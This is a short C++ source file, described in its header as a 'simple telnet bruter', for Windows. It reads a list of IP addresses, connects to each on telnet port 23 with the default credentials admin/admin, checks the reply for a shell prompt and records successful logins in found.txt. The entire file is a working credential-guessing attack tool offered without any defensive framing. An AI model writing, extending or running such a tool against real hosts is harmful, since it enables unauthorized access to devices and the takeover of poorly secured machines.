/*
*  Just a simple telnet bruter in c++. 
*/ 

#include <iostream>
#include <string>
#include <vector>
#include <iterator>
#include <fstream>
#include <algorithm>
#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <thread>
#include <chrono>
#include <future>

using namespace std;


int connect_telnet(std::future<void> future, string ip, string user , string password) {
  

  while (future.wait_for(std::chrono::milliseconds(1)) == std::future_status::timeout){
 
  cout << "Trying: " << ip << " user: " << user << " pass: " << password <<  endl;
  
  int iR;
  int flag = 1; 

  const char* c = ip.data();
  
  WSADATA wsaData;
  iR = WSAStartup(MAKEWORD(2, 2), &wsaData);
  if (iR != 0) { return 1; }
  SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (server == INVALID_SOCKET) { WSACleanup(); return 1; }

  sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = inet_addr(c);
  addr.sin_port = htons(23);

  std::string login = user;
  login.append("\r\n"); 

  std::string pass = password; 
  pass.append("\r\n"); 
  
  std::cout << "Connecting..." << std::endl;
  if ((connect(server, (SOCKADDR *)&addr, sizeof(addr))) == SOCKET_ERROR) {
    std::cout << "Couldn't connect." << std::endl;
    WSACleanup();
    Sleep(500);
    return 0;
  }

  int bRecv = 0;
  char buff[2048];

  recv(server, buff, sizeof(buff), 0);
  std::cout << buff << std::endl;

  if(strlen(buff) == 0) {

      flag = 0; 
  }

  memset(buff, 0, sizeof(buff));

  iR = send(server, login.c_str(), (u_int) login.length(), 0);
  recv(server, buff, sizeof(buff), 0);
  std::cout << buff << std::endl;

  memset(buff, 0, sizeof(buff));

  iR = send(server, pass.c_str(), (u_int) pass.length(), 0);
  recv(server, buff, sizeof(buff), 0);
  std::cout << buff << std::endl;

  if(flag == 0) {
     
     memset(buff, 0, sizeof(buff));
     recv(server, buff, sizeof(buff), 0);
     std::cout << buff << std::endl;
     std::cout << buff << std::endl;

  } 
  

  if(strstr(buff, "$")) {
  if(strstr(buff, "%") == NULL) {


     std::cout << "[+] Found: " << login << pass << std::endl;
     std::ofstream outfile;

     outfile.open("found.txt", std::ios_base::app); // append instead of overwrite
     outfile << ip << ":" << user << ":" << password << std::endl;
     outfile.close(); 

  }  
  }else{
     std::cout << "[-] Not Found: " << std::endl; 
  }

  closesocket(server);

   }

return 0; 

}
void bruter() {
 

  vector<std::thread> threads;
  std::string line;
  int count = 0; 

  std::string str ;
  std::fstream file;
  file.open("ips.txt",std::ios::in);

  while(getline(file, str))
  {
        count++;
  }

  for (int i = 0; i < count; i++) {

      std::getline( std::cin, line );
      std::promise<void> signal_exit; //create promise object
      std::future<void> future = signal_exit.get_future();
      threads.push_back(thread(connect_telnet, std::move(future), line, "admin", "admin"));
      std::this_thread::sleep_for(std::chrono::milliseconds(2000));
      signal_exit.set_value();
  }
  
  for (auto &th : threads) {

    th.join();
  }
}

int main(){

    bruter();
     

    return 0;
 }
